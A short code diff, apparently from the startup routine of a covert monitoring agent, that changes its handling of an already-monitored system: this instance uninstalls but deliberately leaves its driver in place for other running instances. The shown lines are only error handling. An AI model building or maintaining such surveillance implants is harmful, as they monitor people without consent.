@@ -2685,7 +2685,8 @@ void __stdcall HM_sMain(void)
 	REPORT_STATUS_LOG("- Initializing modules..........");
 	if (!AM_Startup()) {
 		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already monitored]\r\n"); 
-		ReportExitProcess(); // AM_Startup fallisce se la sharedmemory gia' esiste
+		g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
+		DA_Uninstall(NULL); // AM_Startup fallisce se la sharedmemory gia' esiste
 	}
 	REPORT_STATUS_LOG("OK\r\n"); 
 
